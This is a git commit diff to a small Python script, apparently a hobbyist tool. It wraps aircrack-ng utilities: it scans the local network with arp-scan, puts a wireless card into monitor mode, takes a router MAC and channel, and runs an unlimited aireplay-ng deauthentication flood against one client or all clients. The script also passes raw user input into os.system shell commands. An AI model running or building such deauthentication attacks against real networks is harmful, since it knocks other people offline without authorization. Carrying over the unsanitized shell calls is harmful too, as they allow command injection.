49b494efe6ee464026590e6edbb3edb3dc66c926
Filip Hobza <filip.hobza.2005@gmail.com>
2022-03-01 14:59:43 +0100

    1.1
    Mac address scan

--- aireplay-script/main.py
+++ aireplay-script/main.py
@@ -18,19 +18,22 @@ mac = "MAC"
 channel = "CHANNEL"
 attack = "ATTACK"
 
+os.system("sudo arp-scan -l")
+print()
+print("Pres ENTER to continue")
+keyboard.wait('enter')
+
 os.system("sudo airmon-ng start wlp4s0")
 os.system("sudo airodump-ng wlp4s0mon")
 print()
 
 mac = input("Write MAC address of router to attack:     ")
-
 channel = input("Write channel to attack:     ")
-
 attack = input("Write MAC address to attack (if -null- it will broadcast to all):     ")
 
 os.system(f"sudo iwconfig wlp4s0mon channel {channel}")
 
-if(attack==""):
+if attack == "":
     os.system(f"sudo aireplay-ng -0 0 -a {mac} wlp4s0mon")
 else:
     os.system(f"sudo aireplay-ng -0 0 -a {mac} -c {attack} wlp4s0mon")
